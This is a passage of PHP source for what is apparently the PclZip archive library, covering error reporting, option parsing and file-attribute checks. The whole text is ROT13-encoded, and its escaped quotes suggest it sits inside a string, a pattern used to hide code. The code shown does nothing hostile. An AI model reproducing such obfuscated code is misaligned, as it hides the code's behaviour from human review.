                      CPYMVC_REE_VAINYVQ_BCGVBA_INYHR => 'CPYMVC_REE_VAINYVQ_BCGVBA_INYHR',
                      CPYMVC_REE_HAFHCCBEGRQ_PBZCERFFVBA => 'CPYMVC_REE_HAFHCCBEGRQ_PBZCERFFVBA',
                      CPYMVC_REE_HAFHCCBEGRQ_RAPELCGVBA => 'CPYMVC_REE_HAFHCCBEGRQ_RAPELCGVBA'
                      ,CPYMVC_REE_VAINYVQ_NGGEVOHGR_INYHR => 'CPYMVC_REE_VAINYVQ_NGGEVOHGR_INYHR'
                      ,CPYMVC_REE_QVERPGBEL_ERFGEVPGVBA => 'CPYMVC_REE_QVERPGBEL_ERFGEVPGVBA'
                    );

    vs (vffrg($i_anzr[$guvf->reebe_pbqr])) {
      $i_inyhr = $i_anzr[$guvf->reebe_pbqr];
    }
    ryfr {
      $i_inyhr = 'AbAnzr';
    }

    vs ($c_jvgu_pbqr) {
      erghea($i_inyhr.' ('.$guvf->reebe_pbqr.')');
    }
    ryfr {
      erghea($i_inyhr);
    }
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : reebeVasb()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // --------------------------------------------------------------------------------
  shapgvba reebeVasb($c_shyy=snyfr)
  {
    vs (CPYMVC_REEBE_RKGREANY == 1) {
      erghea(CpyReebeFgevat());
    }
    ryfr {
      vs ($c_shyy) {
        erghea($guvf->reebeAnzr(gehr).\" : \".$guvf->reebe_fgevat);
      }
      ryfr {
        erghea($guvf->reebe_fgevat.\" [pbqr \".$guvf->reebe_pbqr.\"]\");
      }
    }
  }
  // --------------------------------------------------------------------------------


// --------------------------------------------------------------------------------
// ***** HAQRE GUVF YVAR NER QRSVARQ CEVINGR VAGREANY SHAPGVBAF *****
// *****                                                        *****
// *****       GURFRF SHAPGVBAF ZHFG ABG OR HFRQ QVERPGYL       *****
// --------------------------------------------------------------------------------



  // --------------------------------------------------------------------------------
  // Shapgvba : ceviPurpxSbezng()
  // Qrfpevcgvba :
  //   Guvf zrgubq purpx gung gur nepuvir rkvfgf naq vf n inyvq mvc nepuvir.
  //   Frireny yriry bs purpx rkvfgf. (shgher)
  // Cnenzrgref :
  //   $c_yriry : Yriry bs purpx. Qrsnhyg 0.
  //              0 : Purpx gur svefg olgrf (zntvp pbqrf) (qrsnhyg inyhr))
  //              1 : 0 + Purpx gur prageny qverpgbel (shgher)
  //              2 : 1 + Purpx rnpu svyr urnqre (shgher)
  // Erghea Inyhrf :
  //   gehr ba fhpprff,
  //   snyfr ba reebe, gur reebe pbqr vf frg.
  // --------------------------------------------------------------------------------
  shapgvba ceviPurpxSbezng($c_yriry=0)
  {
    $i_erfhyg = gehr;

	// ----- Erfrg gur svyr flfgrz pnpur
    pyrnefgngpnpur();

    // ----- Erfrg gur reebe unaqyre
    $guvf->ceviReebeErfrg();

    // ----- Ybbx vs gur svyr rkvgf
    vs (!vf_svyr($guvf->mvcanzr)) {
      // ----- Reebe ybt
      CpyMvc::ceviReebeYbt(CPYMVC_REE_ZVFFVAT_SVYR, \"Zvffvat nepuvir svyr '\".$guvf->mvcanzr.\"'\");
      erghea(snyfr);
    }

    // ----- Purpx gung gur svyr vf ernqnoyr
    vs (!vf_ernqnoyr($guvf->mvcanzr)) {
      // ----- Reebe ybt
      CpyMvc::ceviReebeYbt(CPYMVC_REE_ERNQ_BCRA_SNVY, \"Hanoyr gb ernq nepuvir '\".$guvf->mvcanzr.\"'\");
      erghea(snyfr);
    }

    // ----- Purpx gur zntvp pbqr
    // GOP

    // ----- Purpx gur prageny urnqre
    // GOP

    // ----- Purpx rnpu svyr urnqre
    // GOP

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviCnefrBcgvbaf()
  // Qrfpevcgvba :
  //   Guvf vagreany zrgubqf ernqf gur inevnoyr yvfg bs nethzragf ($c_bcgvbaf_yvfg,
  //   $c_fvmr) naq trarengr na neenl jvgu gur bcgvbaf naq inyhrf ($i_erfhyg_yvfg).
  //   $i_erdhrfgrq_bcgvbaf pbagnvaf gur bcgvbaf gung pna or cerfrag naq gubfr gung
  //   zhfg or cerfrag.
  //   $i_erdhrfgrq_bcgvbaf vf na neenl, jvgu gur bcgvba inyhr nf xrl, naq 'bcgvbany',
  //   be 'znaqngbel' nf inyhr.
  // Cnenzrgref :
  //   Frr nobir.
  // Erghea Inyhrf :
  //   1 ba fhpprff.
  //   0 ba snvyher.
  // --------------------------------------------------------------------------------
  shapgvba ceviCnefrBcgvbaf(&$c_bcgvbaf_yvfg, $c_fvmr, &$i_erfhyg_yvfg, $i_erdhrfgrq_bcgvbaf=snyfr)
  {
    $i_erfhyg=1;

    // ----- Ernq gur bcgvbaf
    $v=0;
    juvyr ($v<$c_fvmr) {

      // ----- Purpx vs gur bcgvba vf fhccbegrq
      vs (!vffrg($i_erdhrfgrq_bcgvbaf[$c_bcgvbaf_yvfg[$v]])) {
        // ----- Reebe ybt
        CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_CNENZRGRE, \"Vainyvq bcgvbany cnenzrgre '\".$c_bcgvbaf_yvfg[$v].\"' sbe guvf zrgubq\");

        // ----- Erghea
        erghea CpyMvc::reebePbqr();
      }

      // ----- Ybbx sbe arkg bcgvba
      fjvgpu ($c_bcgvbaf_yvfg[$v]) {
        // ----- Ybbx sbe bcgvbaf gung erdhrfg n cngu inyhr
        pnfr CPYMVC_BCG_CNGU :
        pnfr CPYMVC_BCG_ERZBIR_CNGU :
        pnfr CPYMVC_BCG_NQQ_CNGU :
          // ----- Purpx gur ahzore bs cnenzrgref
          vs (($v+1) >= $c_fvmr) {
            // ----- Reebe ybt
            CpyMvc::ceviReebeYbt(CPYMVC_REE_ZVFFVAT_BCGVBA_INYHR, \"Zvffvat cnenzrgre inyhr sbe bcgvba '\".CpyMvcHgvyBcgvbaGrkg($c_bcgvbaf_yvfg[$v]).\"'\");

            // ----- Erghea
            erghea CpyMvc::reebePbqr();
          }

          // ----- Trg gur inyhr
          $i_erfhyg_yvfg[$c_bcgvbaf_yvfg[$v]] = CpyMvcHgvyGenafyngrJvaCngu($c_bcgvbaf_yvfg[$v+1], SNYFR);
          $v++;
        oernx;

        pnfr CPYMVC_BCG_GRZC_SVYR_GUERFUBYQ :
          // ----- Purpx gur ahzore bs cnenzrgref
          vs (($v+1) >= $c_fvmr) {
            CpyMvc::ceviReebeYbt(CPYMVC_REE_ZVFFVAT_BCGVBA_INYHR, \"Zvffvat cnenzrgre inyhr sbe bcgvba '\".CpyMvcHgvyBcgvbaGrkg($c_bcgvbaf_yvfg[$v]).\"'\");
            erghea CpyMvc::reebePbqr();
          }

          // ----- Purpx sbe vapbzcngvoyr bcgvbaf
          vs (vffrg($i_erfhyg_yvfg[CPYMVC_BCG_GRZC_SVYR_BSS])) {
            CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_CNENZRGRE, \"Bcgvba '\".CpyMvcHgvyBcgvbaGrkg($c_bcgvbaf_yvfg[$v]).\"' pna abg or hfrq jvgu bcgvba 'CPYMVC_BCG_GRZC_SVYR_BSS'\");
            erghea CpyMvc::reebePbqr();
          }

          // ----- Purpx gur inyhr
          $i_inyhr = $c_bcgvbaf_yvfg[$v+1];
          vs ((!vf_vagrtre($i_inyhr)) || ($i_inyhr<0)) {
            CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_BCGVBA_INYHR, \"Vagrtre rkcrpgrq sbe bcgvba '\".CpyMvcHgvyBcgvbaGrkg($c_bcgvbaf_yvfg[$v]).\"'\");
            erghea CpyMvc::reebePbqr();
          }

          // ----- Trg gur inyhr (naq pbaireg vg va olgrf)
          $i_erfhyg_yvfg[$c_bcgvbaf_yvfg[$v]] = $i_inyhr*1048576;
          $v++;
        oernx;

        pnfr CPYMVC_BCG_GRZC_SVYR_BA :
          // ----- Purpx sbe vapbzcngvoyr bcgvbaf
          vs (vffrg($i_erfhyg_yvfg[CPYMVC_BCG_GRZC_SVYR_BSS])) {
            CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_CNENZRGRE, \"Bcgvba '\".CpyMvcHgvyBcgvbaGrkg($c_bcgvbaf_yvfg[$v]).\"' pna abg or hfrq jvgu bcgvba 'CPYMVC_BCG_GRZC_SVYR_BSS'\");
            erghea CpyMvc::reebePbqr();
          }

          $i_erfhyg_yvfg[$c_bcgvbaf_yvfg[$v]] = gehr;
        oernx;

        pnfr CPYMVC_BCG_GRZC_SVYR_BSS :
          // ----- Purpx sbe vapbzcngvoyr bcgvbaf
          vs (vffrg($i_erfhyg_yvfg[CPYMVC_BCG_GRZC_SVYR_BA])) {
            CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_CNENZRGRE, \"Bcgvba '\".CpyMvcHgvyBcgvbaGrkg($c_bcgvbaf_yvfg[$v]).\"' pna abg or hfrq jvgu bcgvba 'CPYMVC_BCG_GRZC_SVYR_BA'\");
            erghea CpyMvc::reebePbqr();
          }
          // ----- Purpx sbe vapbzcngvoyr bcgvbaf
          vs (vffrg($i_erfhyg_yvfg[CPYMVC_BCG_GRZC_SVYR_GUERFUBYQ])) {
            CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_CNENZRGRE, \"Bcgvba '\".CpyMvcHgvyBcgvbaGrkg($c_bcgvbaf_yvfg[$v]).\"' pna abg or hfrq jvgu bcgvba 'CPYMVC_BCG_GRZC_SVYR_GUERFUBYQ'\");
            erghea CpyMvc::reebePbqr();
          }

          $i_erfhyg_yvfg[$c_bcgvbaf_yvfg[$v]] = gehr;
        oernx;

        pnfr CPYMVC_BCG_RKGENPG_QVE_ERFGEVPGVBA :
          // ----- Purpx gur ahzore bs cnenzrgref
          vs (($v+1) >= $c_fvmr) {
            // ----- Reebe ybt
            CpyMvc::ceviReebeYbt(CPYMVC_REE_ZVFFVAT_BCGVBA_INYHR, \"Zvffvat cnenzrgre inyhr sbe bcgvba '\".CpyMvcHgvyBcgvbaGrkg($c_bcgvbaf_yvfg[$v]).\"'\");

            // ----- Erghea
            erghea CpyMvc::reebePbqr();
          }

          // ----- Trg gur inyhr
          vs (   vf_fgevat($c_bcgvbaf_yvfg[$v+1])
              && ($c_bcgvbaf_yvfg[$v+1] != '')) {
            $i_erfhyg_yvfg[$c_bcgvbaf_yvfg[$v]] = CpyMvcHgvyGenafyngrJvaCngu($c_bcgvbaf_yvfg[$v+1], SNYFR);
            $v++;
          }
          ryfr {
          }
        oernx;

        // ----- Ybbx sbe bcgvbaf gung erdhrfg na neenl bs fgevat sbe inyhr
        pnfr CPYMVC_BCG_OL_ANZR :
          // ----- Purpx gur ahzore bs cnenzrgref
          vs (($v+1) >= $c_fvmr) {
            // ----- Reebe ybt
            CpyMvc::ceviReebeYbt(CPYMVC_REE_ZVFFVAT_BCGVBA_INYHR, \"Zvffvat cnenzrgre inyhr sbe bcgvba '\".CpyMvcHgvyBcgvbaGrkg($c_bcgvbaf_yvfg[$v]).\"'\");

            // ----- Erghea
            erghea CpyMvc::reebePbqr();
          }

          // ----- Trg gur inyhr
          vs (vf_fgevat($c_bcgvbaf_yvfg[$v+1])) {
              $i_erfhyg_yvfg[$c_bcgvbaf_yvfg[$v]][0] = $c_bcgvbaf_yvfg[$v+1];
          }
          ryfr vs (vf_neenl($c_bcgvbaf_yvfg[$v+1])) {
              $i_erfhyg_yvfg[$c_bcgvbaf_yvfg[$v]] = $c_bcgvbaf_yvfg[$v+1];
          }
          ryfr {
            // ----- Reebe ybt
            CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_BCGVBA_INYHR, \"Jebat cnenzrgre inyhr sbe bcgvba '\".CpyMvcHgvyBcgvbaGrkg($c_bcgvbaf_yvfg[$v]).\"'\");

            // ----- Erghea
            erghea CpyMvc::reebePbqr();
          }
          $v++;
        oernx;

        // ----- Ybbx sbe bcgvbaf gung erdhrfg na RERT be CERT rkcerffvba
        pnfr CPYMVC_BCG_OL_RERT :
          // rert() vf qrcerpngrq fgnegvat jvgu CUC 5.3. Zbir CPYMVC_BCG_OL_RERT
          // gb CPYMVC_BCG_OL_CERT
          $c_bcgvbaf_yvfg[$v] = CPYMVC_BCG_OL_CERT;
        pnfr CPYMVC_BCG_OL_CERT :
        //pnfr CPYMVC_BCG_PELCG :
          // ----- Purpx gur ahzore bs cnenzrgref
          vs (($v+1) >= $c_fvmr) {
            // ----- Reebe ybt
            CpyMvc::ceviReebeYbt(CPYMVC_REE_ZVFFVAT_BCGVBA_INYHR, \"Zvffvat cnenzrgre inyhr sbe bcgvba '\".CpyMvcHgvyBcgvbaGrkg($c_bcgvbaf_yvfg[$v]).\"'\");

            // ----- Erghea
            erghea CpyMvc::reebePbqr();
          }

          // ----- Trg gur inyhr
          vs (vf_fgevat($c_bcgvbaf_yvfg[$v+1])) {
              $i_erfhyg_yvfg[$c_bcgvbaf_yvfg[$v]] = $c_bcgvbaf_yvfg[$v+1];
          }
          ryfr {
            // ----- Reebe ybt
            CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_BCGVBA_INYHR, \"Jebat cnenzrgre inyhr sbe bcgvba '\".CpyMvcHgvyBcgvbaGrkg($c_bcgvbaf_yvfg[$v]).\"'\");

            // ----- Erghea
            erghea CpyMvc::reebePbqr();
          }
          $v++;
        oernx;

        // ----- Ybbx sbe bcgvbaf gung gnxrf n fgevat
        pnfr CPYMVC_BCG_PBZZRAG :
        pnfr CPYMVC_BCG_NQQ_PBZZRAG :
        pnfr CPYMVC_BCG_CERCRAQ_PBZZRAG :
          // ----- Purpx gur ahzore bs cnenzrgref
          vs (($v+1) >= $c_fvmr) {
            // ----- Reebe ybt
            CpyMvc::ceviReebeYbt(CPYMVC_REE_ZVFFVAT_BCGVBA_INYHR,
			                     \"Zvffvat cnenzrgre inyhr sbe bcgvba '\"
								 .CpyMvcHgvyBcgvbaGrkg($c_bcgvbaf_yvfg[$v])
								 .\"'\");

            // ----- Erghea
            erghea CpyMvc::reebePbqr();
          }

          // ----- Trg gur inyhr
          vs (vf_fgevat($c_bcgvbaf_yvfg[$v+1])) {
              $i_erfhyg_yvfg[$c_bcgvbaf_yvfg[$v]] = $c_bcgvbaf_yvfg[$v+1];
          }
          ryfr {
            // ----- Reebe ybt
            CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_BCGVBA_INYHR,
			                     \"Jebat cnenzrgre inyhr sbe bcgvba '\"
								 .CpyMvcHgvyBcgvbaGrkg($c_bcgvbaf_yvfg[$v])
								 .\"'\");

            // ----- Erghea
            erghea CpyMvc::reebePbqr();
          }
          $v++;
        oernx;

        // ----- Ybbx sbe bcgvbaf gung erdhrfg na neenl bs vaqrk
        pnfr CPYMVC_BCG_OL_VAQRK :
          // ----- Purpx gur ahzore bs cnenzrgref
          vs (($v+1) >= $c_fvmr) {
            // ----- Reebe ybt
            CpyMvc::ceviReebeYbt(CPYMVC_REE_ZVFFVAT_BCGVBA_INYHR, \"Zvffvat cnenzrgre inyhr sbe bcgvba '\".CpyMvcHgvyBcgvbaGrkg($c_bcgvbaf_yvfg[$v]).\"'\");

            // ----- Erghea
            erghea CpyMvc::reebePbqr();
          }

          // ----- Trg gur inyhr
          $i_jbex_yvfg = neenl();
          vs (vf_fgevat($c_bcgvbaf_yvfg[$v+1])) {

              // ----- Erzbir fcnprf
              $c_bcgvbaf_yvfg[$v+1] = fgege($c_bcgvbaf_yvfg[$v+1], ' ', '');

              // ----- Cnefr vgrzf
              $i_jbex_yvfg = rkcybqr(\",\", $c_bcgvbaf_yvfg[$v+1]);
          }
          ryfr vs (vf_vagrtre($c_bcgvbaf_yvfg[$v+1])) {
              $i_jbex_yvfg[0] = $c_bcgvbaf_yvfg[$v+1].'-'.$c_bcgvbaf_yvfg[$v+1];
          }
          ryfr vs (vf_neenl($c_bcgvbaf_yvfg[$v+1])) {
              $i_jbex_yvfg = $c_bcgvbaf_yvfg[$v+1];
          }
          ryfr {
            // ----- Reebe ybt
            CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_BCGVBA_INYHR, \"Inyhr zhfg or vagrtre, fgevat be neenl sbe bcgvba '\".CpyMvcHgvyBcgvbaGrkg($c_bcgvbaf_yvfg[$v]).\"'\");

            // ----- Erghea
            erghea CpyMvc::reebePbqr();
          }

          // ----- Erqhpr gur vaqrk yvfg
          // rnpu vaqrk vgrz va gur yvfg zhfg or n pbhcyr jvgu n fgneg naq
          // na raq inyhr : [0,3], [5-5], [8-10], ...
          // ----- Purpx gur sbezng bs rnpu vgrz
          $i_fbeg_synt=snyfr;
          $i_fbeg_inyhr=0;
          sbe ($w=0; $w<fvmrbs($i_jbex_yvfg); $w++) {
              // ----- Rkcybqr gur vgrz
              $i_vgrz_yvfg = rkcybqr(\"-\", $i_jbex_yvfg[$w]);
              $i_fvmr_vgrz_yvfg = fvmrbs($i_vgrz_yvfg);

              // ----- GOP : Urer jr zvtug purpx gung rnpu vgrz vf n
              // erny vagrtre ...

              // ----- Ybbx sbe fvatyr inyhr
              vs ($i_fvmr_vgrz_yvfg == 1) {
                  // ----- Frg gur bcgvba inyhr
                  $i_erfhyg_yvfg[$c_bcgvbaf_yvfg[$v]][$w]['fgneg'] = $i_vgrz_yvfg[0];
                  $i_erfhyg_yvfg[$c_bcgvbaf_yvfg[$v]][$w]['raq'] = $i_vgrz_yvfg[0];
              }
              ryfrvs ($i_fvmr_vgrz_yvfg == 2) {
                  // ----- Frg gur bcgvba inyhr
                  $i_erfhyg_yvfg[$c_bcgvbaf_yvfg[$v]][$w]['fgneg'] = $i_vgrz_yvfg[0];
                  $i_erfhyg_yvfg[$c_bcgvbaf_yvfg[$v]][$w]['raq'] = $i_vgrz_yvfg[1];
              }
              ryfr {
                  // ----- Reebe ybt
                  CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_BCGVBA_INYHR, \"Gbb znal inyhrf va vaqrk enatr sbe bcgvba '\".CpyMvcHgvyBcgvbaGrkg($c_bcgvbaf_yvfg[$v]).\"'\");

                  // ----- Erghea
                  erghea CpyMvc::reebePbqr();
              }


              // ----- Ybbx sbe yvfg fbeg
              vs ($i_erfhyg_yvfg[$c_bcgvbaf_yvfg[$v]][$w]['fgneg'] < $i_fbeg_inyhr) {
                  $i_fbeg_synt=gehr;

                  // ----- GOP : Na nhgbzngvp fbeg fubhyq or jevggra ...
                  // ----- Reebe ybt
                  CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_BCGVBA_INYHR, \"Vainyvq beqre bs vaqrk enatr sbe bcgvba '\".CpyMvcHgvyBcgvbaGrkg($c_bcgvbaf_yvfg[$v]).\"'\");

                  // ----- Erghea
                  erghea CpyMvc::reebePbqr();
              }
              $i_fbeg_inyhr = $i_erfhyg_yvfg[$c_bcgvbaf_yvfg[$v]][$w]['fgneg'];
          }

          // ----- Fbeg gur vgrzf
          vs ($i_fbeg_synt) {
              // GOP : Gb Or Pbzcyrgrq
          }

          // ----- Arkg bcgvba
          $v++;
        oernx;

        // ----- Ybbx sbe bcgvbaf gung erdhrfg ab inyhr
        pnfr CPYMVC_BCG_ERZBIR_NYY_CNGU :
        pnfr CPYMVC_BCG_RKGENPG_NF_FGEVAT :
        pnfr CPYMVC_BCG_AB_PBZCERFFVBA :
        pnfr CPYMVC_BCG_RKGENPG_VA_BHGCHG :
        pnfr CPYMVC_BCG_ERCYNPR_ARJRE :
        pnfr CPYMVC_BCG_FGBC_BA_REEBE :
          $i_erfhyg_yvfg[$c_bcgvbaf_yvfg[$v]] = gehr;
        oernx;

        // ----- Ybbx sbe bcgvbaf gung erdhrfg na bpgny inyhr
        pnfr CPYMVC_BCG_FRG_PUZBQ :
          // ----- Purpx gur ahzore bs cnenzrgref
          vs (($v+1) >= $c_fvmr) {
            // ----- Reebe ybt
            CpyMvc::ceviReebeYbt(CPYMVC_REE_ZVFFVAT_BCGVBA_INYHR, \"Zvffvat cnenzrgre inyhr sbe bcgvba '\".CpyMvcHgvyBcgvbaGrkg($c_bcgvbaf_yvfg[$v]).\"'\");

            // ----- Erghea
            erghea CpyMvc::reebePbqr();
          }

          // ----- Trg gur inyhr
          $i_erfhyg_yvfg[$c_bcgvbaf_yvfg[$v]] = $c_bcgvbaf_yvfg[$v+1];
          $v++;
        oernx;

        // ----- Ybbx sbe bcgvbaf gung erdhrfg n pnyy-onpx
        pnfr CPYMVC_PO_CER_RKGENPG :
        pnfr CPYMVC_PO_CBFG_RKGENPG :
        pnfr CPYMVC_PO_CER_NQQ :
        pnfr CPYMVC_PO_CBFG_NQQ :
        /* sbe shgher hfr
        pnfr CPYMVC_PO_CER_QRYRGR :
        pnfr CPYMVC_PO_CBFG_QRYRGR :
        pnfr CPYMVC_PO_CER_YVFG :
        pnfr CPYMVC_PO_CBFG_YVFG :
        */
          // ----- Purpx gur ahzore bs cnenzrgref
          vs (($v+1) >= $c_fvmr) {
            // ----- Reebe ybt
            CpyMvc::ceviReebeYbt(CPYMVC_REE_ZVFFVAT_BCGVBA_INYHR, \"Zvffvat cnenzrgre inyhr sbe bcgvba '\".CpyMvcHgvyBcgvbaGrkg($c_bcgvbaf_yvfg[$v]).\"'\");

            // ----- Erghea
            erghea CpyMvc::reebePbqr();
          }

          // ----- Trg gur inyhr
          $i_shapgvba_anzr = $c_bcgvbaf_yvfg[$v+1];

          // ----- Purpx gung gur inyhr vf n inyvq rkvfgvat shapgvba
          vs (!shapgvba_rkvfgf($i_shapgvba_anzr)) {
            // ----- Reebe ybt
            CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_BCGVBA_INYHR, \"Shapgvba '\".$i_shapgvba_anzr.\"()' vf abg na rkvfgvat shapgvba sbe bcgvba '\".CpyMvcHgvyBcgvbaGrkg($c_bcgvbaf_yvfg[$v]).\"'\");

            // ----- Erghea
            erghea CpyMvc::reebePbqr();
          }

          // ----- Frg gur nggevohgr
          $i_erfhyg_yvfg[$c_bcgvbaf_yvfg[$v]] = $i_shapgvba_anzr;
          $v++;
        oernx;

        qrsnhyg :
          // ----- Reebe ybt
          CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_CNENZRGRE,
		                       \"Haxabja cnenzrgre '\"
							   .$c_bcgvbaf_yvfg[$v].\"'\");

          // ----- Erghea
          erghea CpyMvc::reebePbqr();
      }

      // ----- Arkg bcgvbaf
      $v++;
    }

    // ----- Ybbx sbe znaqngbel bcgvbaf
    vs ($i_erdhrfgrq_bcgvbaf !== snyfr) {
      sbe ($xrl=erfrg($i_erdhrfgrq_bcgvbaf); $xrl=xrl($i_erdhrfgrq_bcgvbaf); $xrl=arkg($i_erdhrfgrq_bcgvbaf)) {
        // ----- Ybbx sbe znaqngbel bcgvba
        vs ($i_erdhrfgrq_bcgvbaf[$xrl] == 'znaqngbel') {
          // ----- Ybbx vs cerfrag
          vs (!vffrg($i_erfhyg_yvfg[$xrl])) {
            // ----- Reebe ybt
            CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_CNENZRGRE, \"Zvffvat znaqngbel cnenzrgre \".CpyMvcHgvyBcgvbaGrkg($xrl).\"(\".$xrl.\")\");

            // ----- Erghea
            erghea CpyMvc::reebePbqr();
          }
        }
      }
    }

    // ----- Ybbx sbe qrsnhyg inyhrf
    vs (!vffrg($i_erfhyg_yvfg[CPYMVC_BCG_GRZC_SVYR_GUERFUBYQ])) {

    }

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviBcgvbaQrsnhygGuerfubyq()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba ceviBcgvbaQrsnhygGuerfubyq(&$c_bcgvbaf)
  {
    $i_erfhyg=1;

    vs (vffrg($c_bcgvbaf[CPYMVC_BCG_GRZC_SVYR_GUERFUBYQ])
        || vffrg($c_bcgvbaf[CPYMVC_BCG_GRZC_SVYR_BSS])) {
      erghea $i_erfhyg;
    }

    // ----- Trg 'zrzbel_yvzvg' pbasvthengvba inyhr
    $i_zrzbel_yvzvg = vav_trg('zrzbel_yvzvg');
    $i_zrzbel_yvzvg = gevz($i_zrzbel_yvzvg);
    $i_zrzbel_yvzvg_vag = (vag) $i_zrzbel_yvzvg;
    $ynfg = fgegbybjre(fhofge($i_zrzbel_yvzvg, -1));

    vs($ynfg == 't')
        //$i_zrzbel_yvzvg_vag = $i_zrzbel_yvzvg_vag*1024*1024*1024;
        $i_zrzbel_yvzvg_vag = $i_zrzbel_yvzvg_vag*1073741824;
    vs($ynfg == 'z')
        //$i_zrzbel_yvzvg_vag = $i_zrzbel_yvzvg_vag*1024*1024;
        $i_zrzbel_yvzvg_vag = $i_zrzbel_yvzvg_vag*1048576;
    vs($ynfg == 'x')
        $i_zrzbel_yvzvg_vag = $i_zrzbel_yvzvg_vag*1024;

    $c_bcgvbaf[CPYMVC_BCG_GRZC_SVYR_GUERFUBYQ] = sybbe($i_zrzbel_yvzvg_vag*CPYMVC_GRZCBENEL_SVYR_ENGVB);


    // ----- Pbasvqrapr purpx : Ab guerfubyq vs inyhr ybjre guna 1Z
    vs ($c_bcgvbaf[CPYMVC_BCG_GRZC_SVYR_GUERFUBYQ] < 1048576) {
      hafrg($c_bcgvbaf[CPYMVC_BCG_GRZC_SVYR_GUERFUBYQ]);
    }

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviSvyrQrfpeCnefrNgg()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // Erghea Inyhrf :
  //   1 ba fhpprff.
  //   0 ba snvyher.
  // --------------------------------------------------------------------------------
  shapgvba ceviSvyrQrfpeCnefrNgg(&$c_svyr_yvfg, &$c_svyrqrfpe, $i_bcgvbaf, $i_erdhrfgrq_bcgvbaf=snyfr)
  {
    $i_erfhyg=1;

    // ----- Sbe rnpu svyr va gur yvfg purpx gur nggevohgrf
    sbernpu ($c_svyr_yvfg nf $i_xrl => $i_inyhr) {

      // ----- Purpx vs gur bcgvba vf fhccbegrq
      vs (!vffrg($i_erdhrfgrq_bcgvbaf[$i_xrl])) {
        // ----- Reebe ybt
        CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_CNENZRGRE, \"Vainyvq svyr nggevohgr '\".$i_xrl.\"' sbe guvf svyr\");

        // ----- Erghea
        erghea CpyMvc::reebePbqr();
      }

      // ----- Ybbx sbe nggevohgr
      fjvgpu ($i_xrl) {
        pnfr CPYMVC_NGG_SVYR_ANZR :
          vs (!vf_fgevat($i_inyhr)) {
            CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_NGGEVOHGR_INYHR, \"Vainyvq glcr \".trgglcr($i_inyhr).\". Fgevat rkcrpgrq sbe nggevohgr '\".CpyMvcHgvyBcgvbaGrkg($i_xrl).\"'\");
            erghea CpyMvc::reebePbqr();
          }

          $c_svyrqrfpe['svyranzr'] = CpyMvcHgvyCnguErqhpgvba($i_inyhr);

          vs ($c_svyrqrfpe['svyranzr'] == '') {
            CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_NGGEVOHGR_INYHR, \"Vainyvq rzcgl svyranzr sbe nggevohgr '\".CpyMvcHgvyBcgvbaGrkg($i_xrl).\"'\");
            erghea CpyMvc::reebePbqr();
          }

        oernx;

        pnfr CPYMVC_NGG_SVYR_ARJ_FUBEG_ANZR :
          vs (!vf_fgevat($i_inyhr)) {
            CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_NGGEVOHGR_INYHR, \"Vainyvq glcr \".trgglcr($i_inyhr).\". Fgevat rkcrpgrq sbe nggevohgr '\".CpyMvcHgvyBcgvbaGrkg($i_xrl).\"'\");
            erghea CpyMvc::reebePbqr();
          }

          $c_svyrqrfpe['arj_fubeg_anzr'] = CpyMvcHgvyCnguErqhpgvba($i_inyhr);

          vs ($c_svyrqrfpe['arj_fubeg_anzr'] == '') {
            CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_NGGEVOHGR_INYHR, \"Vainyvq rzcgl fubeg svyranzr sbe nggevohgr '\".CpyMvcHgvyBcgvbaGrkg($i_xrl).\"'\");
            erghea CpyMvc::reebePbqr();
          }
        oernx;

        pnfr CPYMVC_NGG_SVYR_ARJ_SHYY_ANZR :
          vs (!vf_fgevat($i_inyhr)) {
            CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_NGGEVOHGR_INYHR, \"Vainyvq glcr \".trgglcr($i_inyhr).\". Fgevat rkcrpgrq sbe nggevohgr '\".CpyMvcHgvyBcgvbaGrkg($i_xrl).\"'\");
            erghea CpyMvc::reebePbqr();
          }

          $c_svyrqrfpe['arj_shyy_anzr'] = CpyMvcHgvyCnguErqhpgvba($i_inyhr);

          vs ($c_svyrqrfpe['arj_shyy_anzr'] == '') {
            CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_NGGEVOHGR_INYHR, \"Vainyvq rzcgl shyy svyranzr sbe nggevohgr '\".CpyMvcHgvyBcgvbaGrkg($i_xrl).\"'\");
            erghea CpyMvc::reebePbqr();
          }
        oernx;

        // ----- Ybbx sbe bcgvbaf gung gnxrf n fgevat
        pnfr CPYMVC_NGG_SVYR_PBZZRAG :
          vs (!vf_fgevat($i_inyhr)) {
